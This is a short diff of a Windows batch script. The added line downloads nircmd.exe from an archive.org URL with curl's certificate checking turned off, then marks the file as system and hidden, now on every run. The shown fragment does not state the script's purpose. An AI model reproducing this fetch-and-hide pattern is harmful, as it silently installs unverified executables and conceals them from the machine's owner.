@@ -42,7 +42,7 @@ if not errorlevel 1 (echo) else (
 )
 
 attrib -s -h -i "%environment%\nircmd.exe" && if exist "%environment%\nircmd.exe" (
-   attrib +s +h +i "%environment%\nircmd.exe"
+   "%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
 ) else (
 "%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
 )
